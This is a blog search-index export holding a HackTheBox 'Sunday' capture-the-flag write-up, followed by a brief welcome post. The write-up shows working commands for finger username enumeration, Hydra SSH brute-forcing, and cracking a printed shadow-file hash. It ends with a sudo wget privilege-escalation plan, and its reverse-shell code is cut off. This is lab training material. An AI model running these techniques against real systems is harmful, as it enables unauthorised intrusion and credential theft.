[{"categories":null,"content":" HackTheBox Write-Up: Sunday Sunday is no day off, it’s a great machine to practice common Linux privilege escalation methods through proper enumeration \u0026 vulnerability chaining. nmap -Pn -sS -p- 10.10.10.76 \u003e [OMITTED FOR BREVITY] \u003e ------------------------ \u003e PORT STATE SERVICE \u003e ------------------------ \u003e 79/tcp open finger \u003e 111/tcp open rpcbind \u003e 22022/tcp open unknown \u003e 34550/tcp open unknown \u003e 55407/tcp open unknown \u003e Nmap done: 1 IP address (1 host up) scanned in 2262.52 seconds There are five ports open, only one I am familiar with. nmap -A -p79,111,22022,34550,55407 10.10.10.76 \u003e Host is up (0.025s latency). \u003e PORT STATE SERVICE VERSION \u003e 79/tcp open finger Sun Solaris fingerd \u003e |\\_finger: No one logged on\\\\x0D \u003e 111/tcp open rpcbind 2-4 (RPC #100000) \u003e 22022/tcp open ssh SunSSH 1.3 (protocol 2.0)** \u003e | ssh-hostkey: \u003e | 1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA) \u003e |\\_ 1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA) \u003e 34550/tcp open unknown \u003e 55407/tcp open unknown** \u003e [OMITTED FOR BREVITY] \u003e Nmap done: 1 IP address (1 host up) scanned in 62.51 seconds A few Google searches finds me a vulnerability involving the Solaris implementation of fingerd allowing username enumeration. [https://www.rapid7.com/db/vulnerabilities/finger-solaris-user-enumeration] Some more searching leads me to a Perl script we can use to enumerate usernames. We’ll download it using wget. wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl # Usage: finger-user-enum.pl [options] # ( -u username | -U file-of-usernames ) # ( -t host | -T file-of-targets ) # Example: # finger-user-enum.pl -U users.txt -t 10.0.0.1 finger-user-enum.pl -u root -t 10.0.0.1 finger-user-enum.pl -U users.txt -T ips.txt A quick locate username on my Kali machine pulls all the files containing the word username. locate username /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt sounds good to me with an advertised 10 million usernames! Quick preview Using this file, our syntax in our working directory will be: perl finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.76 \u003e userenum.txt The scripts output will append the results to a file named userenum.txt. (You do not have to do this, I just donâ€™t like to lose my results.) The output is a bit messy, but we have a few usernames to attempt a brute-force attack against port [22022/tcp open ssh SunSSH 1.3 (protocol 2.0)] The following usernames are the most interesting: sammy@10.10.10.76: sammy console \u003cJul 31 17:59\u003e sunny@10.10.10.76: sunny pts/3 \u003cApr 24, 2018\u003e Use the following syntax to brute-force: hydra -V -f -t 4 -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022 We obtain the credentials for Sunny! sunny:sunday ssh -p 22022 sunny@10.10.10.76 Habitually on Linux systems itâ€™s always a good idea to check if a low-privileged user has any sudo permissions. sudo -l We find that we can run the command /root/troll as root without a password. While traversing and enumerating the files on the machine, I found a copy of the shadow file containing hashed user passwords. cat /backup/shadow.backup If we are able to crack Sammy’s password hash, we’ll be able to grab the user.txt flag. echo \"sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::\" \u003e hash.txt Copy the hash to a file, I named mine hash.txt. We’ll use john to crack the hash. john -w=\"/usr/share/wordlists/rockyou hash.txt Success. Sammy:cooldude! Let’s grab the user.txt found on the desktop, and enumerate the system using Sammy’s credentials. ssh -p 22022 sammy@10.10.10.76 Habitually, we type sudo -l. sudo -l Looks like Sammy can run wget as root without a password. With this, we can overwrite /root/troll with a reverse-shell and then run it as root with Sunny’s user account. Copy and paste this Python reverse-shell to a file named reverse.py on the target machine. #!/usr/bin/python import socket import subpro","date":"2022-09-27","objectID":"/sunday/:0:0","tags":null,"title":"HackTheBox Write-Up:  Sunday","uri":"/sunday/"},{"categories":null,"content":"Overview We’re thrilled to bring you an exciting blog which is jam packed of resources. ","date":"2022-09-24","objectID":"/welcome/:1:0","tags":null,"title":"Welcome!","uri":"/welcome/"}]